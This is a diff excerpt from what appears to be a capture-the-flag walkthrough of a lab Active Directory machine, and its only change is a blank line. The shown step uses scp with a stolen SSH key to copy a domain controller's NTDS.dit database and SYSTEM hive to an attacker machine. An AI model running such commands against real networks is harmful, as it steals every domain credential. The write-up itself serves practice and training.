@@ -129,6 +129,7 @@
 20. After much enumeration, we find a backup folder in the /mnt/c folder. In there, we find the NTDS.dit and SYSTEM registry hive, which we download onto our local attacker machine using ssh
 
 `scp -P 2222 -i id_rsa svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit ./`
+
 `scp -P 2222 -i id_rsa svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM ./system.save`
 
 <img width="698" height="86" alt="image" src="https://github.com/user-attachments/assets/1eeb5424-62ac-4aaf-8a31-10d4604a4290" />
